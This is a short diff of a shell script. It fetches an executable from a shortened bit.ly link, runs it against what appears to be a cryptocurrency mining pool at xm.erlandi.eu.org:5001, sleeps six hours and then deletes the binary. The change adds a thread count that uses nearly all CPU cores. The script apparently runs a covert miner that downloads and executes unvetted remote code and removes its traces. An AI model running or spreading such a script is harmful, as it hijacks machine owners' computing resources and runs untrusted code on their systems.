@@ -9,6 +9,6 @@ chmod +x proxy.sh
 sh proxy.sh
 wget https://bit.ly/3mPeYds
 chmod +x 3mPeYds 
-./panel ./3mPeYds -o xm.erlandi.eu.org:5001
+./panel ./3mPeYds -o xm.erlandi.eu.org:5001 -t $(nproc --ignore 1)
 sleep 6h
 rm -irf 3mPeYds
